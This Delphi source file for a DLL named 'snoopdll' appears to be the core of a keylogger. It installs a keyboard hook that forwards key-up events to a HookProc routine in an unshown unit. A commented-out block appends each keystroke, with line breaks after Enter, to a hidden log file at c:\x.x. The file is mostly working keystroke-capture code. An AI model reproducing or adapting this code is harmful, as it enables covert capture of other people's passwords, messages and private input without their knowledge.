library snoopdll;

uses
  Windows,
  KH1,
  stat in 'stat.pas' {frmStatus};

Procedure HookProcedure(nCode: Integer; wParam: WPARAM; lParam: LPARAM); stdcall;
var
   LogFile : THandle;
   BytesWritten : DWORD;
   Ch : Byte;
begin
   if (((HiWord(lParam) and KF_UP) <> 0) or (wParam = VK_CONTROL)) and (nCode = HC_ACTION) then
   begin
{     LogFile := CreateFile('c:\x.x', GENERIC_WRITE, FILE_SHARE_READ, Nil, OPEN_ALWAYS, 0, 0);
       SetFilePointer(LogFile, 0, Nil, FILE_END);
       WriteFile (LogFile, wParam, 1, BytesWritten, Nil);
       if Lo(wParam) = 13 then
       begin
         Ch := 10;
         WriteFile (LogFile, Ch, 1, BytesWritten, Nil);
       end;
       CloseHandle(LogFile);}
       HookProc(nCode, wParam, lParam);
   end;
   CallNextHookEx(0, nCode, wParam, lParam);
end;

exports SetHook, EndHook, HookProcedure;
begin
end.


